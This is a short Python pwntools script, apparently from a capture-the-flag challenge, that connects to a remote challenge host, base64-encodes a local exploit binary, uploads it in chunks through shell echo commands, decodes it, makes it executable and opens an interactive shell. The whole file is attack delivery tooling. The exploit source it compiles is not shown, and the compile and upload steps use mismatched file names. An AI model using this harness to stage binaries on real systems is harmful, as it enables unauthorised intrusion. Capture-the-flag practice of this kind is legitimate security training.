#!/usr/bin/python
from pwn import *

HOST = "nc.eonew.cn"
PORT = 10100

USER = "pwn"
PW = "sir"

def compile():
    log.info("Compile")
    os.system("gcc -w -static poc.c -o poc")

def exec_cmd(cmd):
    r.sendline(cmd)
    r.recvuntil("$ ")

def upload():
    p = log.progress("Upload")

    with open("./exp", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)
    
    r.recvuntil("$ ")
    
    for i in range(0, len(encoded), 500):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+500]))
        
    exec_cmd("cat benc | base64 -d > exp")    
    exec_cmd("chmod +x exp")
    
    p.success()

def exploit(r):
    # compile()
    upload()

    r.interactive()
    return

r=remote(HOST,PORT)
exploit(r)

